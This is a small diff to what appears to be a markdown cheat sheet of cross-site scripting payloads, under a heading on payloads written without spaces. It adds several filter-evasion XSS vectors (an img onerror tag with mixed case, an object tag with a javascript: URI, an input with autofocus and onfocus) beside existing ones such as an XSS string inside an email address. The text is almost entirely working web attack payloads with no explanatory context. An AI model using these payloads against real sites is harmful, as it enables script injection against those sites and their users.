@@ -114,7 +114,10 @@ test@example(<script>alert(0)</script>).com
 ### Without Space
 ```html
 <img/src/onerror=alert(1)>
-<svg/onload=alert(2)>
+<Img/Src/OnError=_=prompt,_(1)>
+<svg/onload=alert(1)>
+<object/data=javascript:prompt(1)>
+<input/autofocus/onfocus=prompt(1)>
 ```
 
 ### Without dot 
